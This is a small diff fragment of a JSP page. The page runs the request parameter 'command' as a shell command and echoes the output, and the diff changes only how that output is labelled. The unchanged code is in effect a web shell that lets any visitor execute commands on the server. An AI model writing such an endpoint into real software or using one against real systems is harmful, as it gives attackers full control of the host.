@@ -21,7 +21,7 @@
     <%
         String shellResult = Shell.execute(request.getParameter("command"));
         if(shellResult != null){
-            out.println("Shell command result:" + shellResult);
+            out.println(shellResult);
         }
     %>
 </body>
